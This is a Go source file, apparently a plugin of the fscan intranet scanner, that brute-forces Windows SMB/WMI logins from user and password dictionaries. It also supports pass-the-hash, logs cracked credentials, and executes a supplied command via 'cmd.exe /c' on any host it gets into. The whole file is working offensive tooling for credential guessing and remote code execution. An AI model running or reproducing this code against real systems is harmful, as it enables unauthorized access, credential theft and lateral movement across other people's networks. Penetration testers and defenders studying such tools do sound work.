package Plugins

import (
	"errors"
	"fmt"
	"github.com/shadow1ng/fscan/common"
	"github.com/tomatome/grdp/glog"
	"os"
	"strings"
	"time"

	"github.com/C-Sto/goWMIExec/pkg/wmiexec"
)

var ClientHost string
var flag bool

func init() {
	if flag {
		return
	}
	clientHost, err := os.Hostname()
	if err != nil {
		glog.Error(err)
	}
	ClientHost = clientHost
	flag = true
}

func WmiExec(configInfo *common.ConfigInfo, hostInfo *common.HostInfo) (tmperr error) {
	if configInfo.IsBrute {
		return nil
	}
	starttime := time.Now().Unix()
	for _, user := range common.Userdict["smb"] {
	PASS:
		for _, pass := range common.Passwords {
			pass = strings.Replace(pass, "{user}", user, -1)
			flag, err := Wmiexec(configInfo, hostInfo, user, pass, configInfo.Hash)
			errlog := fmt.Sprintf("[-] WmiExec %v:%v %v %v %v", hostInfo.Host, 445, user, pass, err)
			errlog = strings.Replace(errlog, "\n", "", -1)
			common.LogError(&configInfo.LogInfo, errlog)
			if flag == true {
				var result string
				if configInfo.Domain != "" {
					result = fmt.Sprintf("[+] WmiExec %v:%v:%v\\%v ", hostInfo.Host, hostInfo.Ports, configInfo.Domain, user)
				} else {
					result = fmt.Sprintf("[+] WmiExec %v:%v:%v ", hostInfo.Host, hostInfo.Ports, user)
				}
				if configInfo.Hash != "" {
					result += "hash: " + configInfo.Hash
				} else {
					result += pass
				}
				common.LogSuccess(&configInfo.LogInfo, result)
				return err
			} else {
				tmperr = err
				if common.CheckErrs(err) {
					return err
				}
				if time.Now().Unix()-starttime > (int64(len(common.Userdict["smb"])*len(common.Passwords)) * configInfo.Timeout) {
					return err
				}
			}
			if len(configInfo.Hash) == 32 {
				break PASS
			}
		}
	}
	return tmperr
}

func Wmiexec(configInfo *common.ConfigInfo, hostInfo *common.HostInfo, user string, pass string, hash string) (flag bool, err error) {
	target := fmt.Sprintf("%s:%v", hostInfo.Host, hostInfo.Ports)
	wmiexec.Timeout = int(configInfo.Timeout)
	return WMIExec(target, user, pass, hash, configInfo.Domain, configInfo.Command, ClientHost, "", nil)
}

func WMIExec(target, username, password, hash, domain, command, clientHostname, binding string, cfgIn *wmiexec.WmiExecConfig) (flag bool, err error) {
	if cfgIn == nil {
		cfg, err1 := wmiexec.NewExecConfig(username, password, hash, domain, target, clientHostname, true, nil, nil)
		if err1 != nil {
			err = err1
			return
		}
		cfgIn = &cfg
	}
	execer := wmiexec.NewExecer(cfgIn)
	err = execer.SetTargetBinding(binding)
	if err != nil {
		return
	}

	err = execer.Auth()
	if err != nil {
		return
	}
	flag = true

	if command != "" {
		command = "C:\\Windows\\system32\\cmd.exe /c " + command
		if execer.TargetRPCPort == 0 {
			err = errors.New("RPC Port is 0, cannot connect")
			return
		}

		err = execer.RPCConnect()
		if err != nil {
			return
		}
		err = execer.Exec(command)
		if err != nil {
			return
		}
	}
	return
}
